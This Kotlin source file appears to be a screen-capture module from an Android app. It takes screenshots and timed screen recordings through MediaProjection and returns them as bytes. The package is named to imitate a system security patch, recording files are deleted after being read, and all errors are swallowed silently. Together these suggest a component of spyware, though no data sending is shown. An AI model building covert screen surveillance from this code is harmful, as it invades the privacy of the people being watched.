package com.android.security.patch

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.File

object ScreenCap {

    private var projection: MediaProjection? = null
    private var vDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var recorder: MediaRecorder? = null
    private var recordFile: File? = null

    private val callback: MediaProjection.Callback = object : MediaProjection.Callback() {
        override fun onStop() {
            try { vDisplay?.release() } catch (_: Throwable) {}
            try { imageReader?.close() } catch (_: Throwable) {}
            try { recorder?.release() } catch (_: Throwable) {}
            vDisplay = null
            imageReader = null
            recorder = null
            projection = null
        }
    }

    fun isReady() = projection != null

    fun setProjection(p: MediaProjection) {
        try { p.unregisterCallback(callback) } catch (_: Throwable) {}
        try {
            p.registerCallback(callback, Handler(Looper.getMainLooper()))
        } catch (_: Throwable) {}
        projection = p
    }

    fun clearProjection() {
        try { projection?.unregisterCallback(callback) } catch (_: Throwable) {}
        try { projection?.stop() } catch (_: Throwable) {}
        projection = null
    }

    fun metrics(ctx: Context): Triple<Int, Int, Int> {
        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val dm = DisplayMetrics()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val b = wm.currentWindowMetrics.bounds
            val dens = ctx.resources.displayMetrics.densityDpi
            return Triple(b.width(), b.height(), dens)
        } else {
            @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(dm)
            return Triple(dm.widthPixels, dm.heightPixels, dm.densityDpi)
        }
    }

    fun screenshot(ctx: Context): ByteArray? {
        val p = projection ?: return null
        val (w, h, dpi) = metrics(ctx)
        val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        var vd: VirtualDisplay? = null
        return try {
            vd = p.createVirtualDisplay(
                "cap", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, null
            )
            Thread.sleep(500)
            val img = reader.acquireLatestImage() ?: return null
            val plane = img.planes[0]
            val rowStride = plane.rowStride
            val pixStride = plane.pixelStride
            val rowPadding = rowStride - pixStride * w
            val bmpW = w + rowPadding / pixStride
            val bmp = Bitmap.createBitmap(bmpW, h, Bitmap.Config.ARGB_8888)
            bmp.copyPixelsFromBuffer(plane.buffer)
            val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 80, baos)
            img.close()
            baos.toByteArray()
        } catch (e: Throwable) {
            null
        } finally {
            try { reader.close() } catch (_: Throwable) {}
            try { vd?.release() } catch (_: Throwable) {}
        }
    }

    fun startRec(ctx: Context, seconds: Int): Boolean {
        val p = projection ?: return false
        val (w, h, dpi) = metrics(ctx)
        val f = File(ctx.getExternalFilesDir(null), "rec_${System.currentTimeMillis()}.mp4")
        val r = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx)
                else @Suppress("DEPRECATION") MediaRecorder()
        try {
            r.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(w, h)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(4_000_000)
                setOutputFile(f.absolutePath)
                prepare()
            }
            val vd = p.createVirtualDisplay(
                "rec", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                r.surface, null, null
            )
            r.start()
            recorder = r
            vDisplay = vd
            recordFile = f
            Handler(Looper.getMainLooper()).postDelayed({
                stopRec()
            }, seconds * 1000L)
            return true
        } catch (_: Throwable) {
            try { r.release() } catch (_: Throwable) {}
            return false
        }
    }

    fun stopRec(): ByteArray? {
        val f = recordFile
        try { recorder?.stop() } catch (_: Throwable) {}
        try { recorder?.release() } catch (_: Throwable) {}
        recorder = null
        try { vDisplay?.release() } catch (_: Throwable) {}
        vDisplay = null
        recordFile = null
        if (f == null || !f.exists()) return null
        val bytes = f.readBytes()
        f.delete()
        return bytes
    }
}
